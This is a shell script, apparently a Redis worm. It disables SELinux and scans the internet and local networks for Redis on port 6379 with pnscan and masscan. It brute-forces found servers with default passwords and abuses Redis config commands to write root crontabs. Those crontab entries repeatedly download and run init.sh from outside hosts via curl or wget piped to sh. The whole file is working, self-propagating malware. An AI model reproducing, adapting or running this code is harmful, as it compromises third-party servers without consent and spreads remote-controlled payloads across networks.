#!/bin/sh
setenforce 0 2>/dev/null
ulimit -u 50000
sleep 1
iptables -I INPUT 1 -p tcp --dport 6379 -j DROP 2>/dev/null
iptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT 2>/dev/null
sleep 1
ps -fe|grep pnscan |grep -v grep
if [ $? -ne 0 ]
then
	rm -rf .dat .shard .ranges .lan 2>/dev/null
	sleep 1
	echo 'config set dbfilename "backup.db"' > .dat
	echo 'save' >> .dat
	echo 'flushall' >> .dat
	echo 'set backup1 "\n\n\n*/2 * * * * cd1 -fsSL http://103.125.218.107/b2f627/init.sh | sh\n\n"' >> .dat
	echo 'set backup2 "\n\n\n*/3 * * * * wget -q -O- http://103.125.218.107/b2f627/init.sh | sh\n\n"' >> .dat
	echo 'set backup3 "\n\n\n*/4 * * * * curl -fsSL http://global.bitmex.com.de/b2f627fff19fda/init.sh | sh\n\n"' >> .dat
	echo 'set backup4 "\n\n\n*/5 * * * * wd1 -q -O- http://global.bitmex.com.de/b2f627fff19fda/init.sh | sh\n\n"' >> .dat
	echo 'config set dir "/var/spool/cron/"' >> .dat
	echo 'config set dbfilename "root"' >> .dat
	echo 'save' >> .dat
	echo 'config set dir "/var/spool/cron/crontabs"' >> .dat
	echo 'save' >> .dat
	sleep 1
	pnx=pnscan
	[ -x /usr/local/bin/pnscan ] && pnx=/usr/local/bin/pnscan
	[ -x /usr/bin/pnscan ] && pnx=/usr/bin/pnscan
	for x in $( seq 1 224 | sort -R ); do
	for y in $( seq 0 255 | sort -R ); do
	$pnx -t512 -R '6f 73 3a 4c 69 6e 75 78' -W '2a 31 0d 0a 24 34 0d 0a 69 6e 66 6f 0d 0a' $x.$y.0.0/16 6379 > .r.$x.$y.o
	awk '/Linux/ {print $1, $3}' .r.$x.$y.o > .r.$x.$y.l
	while read -r h p; do
	cat .dat | redis-cli -h $h -p $p --raw &
	cat .dat | redis-cli -h $h -p $p -a redis --raw &
	cat .dat | redis-cli -h $h -p $p -a root --raw &
	cat .dat | redis-cli -h $h -p $p -a oracle --raw &
	cat .dat | redis-cli -h $h -p $p -a password --raw &
	cat .dat | redis-cli -h $h -p $p -a p@aaw0rd --raw &
	cat .dat | redis-cli -h $h -p $p -a abc123 --raw &
	cat .dat | redis-cli -h $h -p $p -a abc123! --raw &
	cat .dat | redis-cli -h $h -p $p -a 123456 --raw &
	cat .dat | redis-cli -h $h -p $p -a admin --raw &
	done < .r.$x.$y.l
	done
	done
	sleep 1
	masscan --max-rate 10000 -p6379 --shard $( seq 1 22000 | sort -R | head -n1 )/22000 --exclude 255.255.255.255 0.0.0.0/0 2>/dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .shard
	sleep 1
	while read -r h p; do
	cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
	cat .dat | redis-cli -h $h -p $p -a redis --raw 2>/dev/null 1>/dev/null &
	cat .dat | redis-cli -h $h -p $p -a root --raw 2>/dev/null 1>/dev/null &
	cat .dat | redis-cli -h $h -p $p -a oracle --raw 2>/dev/null 1>/dev/null &
	cat .dat | redis-cli -h $h -p $p -a password --raw 2>/dev/null 1>/dev/null &
	cat .dat | redis-cli -h $h -p $p -a p@aaw0rd --raw 2>/dev/null 1>/dev/null &
	cat .dat | redis-cli -h $h -p $p -a abc123 --raw 2>/dev/null 1>/dev/null &
	cat .dat | redis-cli -h $h -p $p -a abc123! --raw 2>/dev/null 1>/dev/null &
	cat .dat | redis-cli -h $h -p $p -a 123456 --raw 2>/dev/null 1>/dev/null &
	cat .dat | redis-cli -h $h -p $p -a admin --raw 2>/dev/null 1>/dev/null &
	done < .shard
	sleep 1
	masscan --max-rate 10000 -p6379 192.168.0.0/16 172.16.0.0/16 116.62.0.0/16 116.232.0.0/16 116.128.0.0/16 116.163.0.0/16 2>/dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .ranges
	sleep 1
	while read -r h p; do
	cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
	cat .dat | redis-cli -h $h -p $p -a redis --raw 2>/dev/null 1>/dev/null &
	cat .dat | redis-cli -h $h -p $p -a root --raw 2>/dev/null 1>/dev/null &
	cat .dat | redis-cli -h $h -p $p -a oracle --raw 2>/dev/null 1>/dev/null &
	cat .dat | redis-cli -h $h -p $p -a password --raw 2>/dev/null 1>/dev/null &
	cat .dat | redis-cli -h $h -p $p -a p@aaw0rd --raw 2>/dev/null 1>/dev/null &
	cat .dat | redis-cli -h $h -p $p -a abc123 --raw 2>/dev/null 1>/dev/null &
	cat .dat | redis-cli -h $h -p $p -a abc123! --raw 2>/dev/null 1>/dev/null &
	cat .dat | redis-cli -h $h -p $p -a 123456 --raw 2>/dev/null 1>/dev/null &
	cat .dat | redis-cli -h $h -p $p -a admin --raw 2>/dev/null 1>/dev/null &
	done < .ranges
	sleep 1
	ip a | grep -oE '([0-9]{1,3}.?){4}/[0-9]{2}' 2>/dev/null | sed 's/\/\([0-9]\{2\}\)/\/16/g' > .inet
	sleep 1
	masscan --max-rate 10000 -p6379 -iL .inet | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .lan
	sleep 1
	while read -r h p; do
	cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
	done < .lan
	sleep 60
	rm -rf .dat .shard .ranges .lan 2>/dev/null
else
	echo "root runing....."
fi

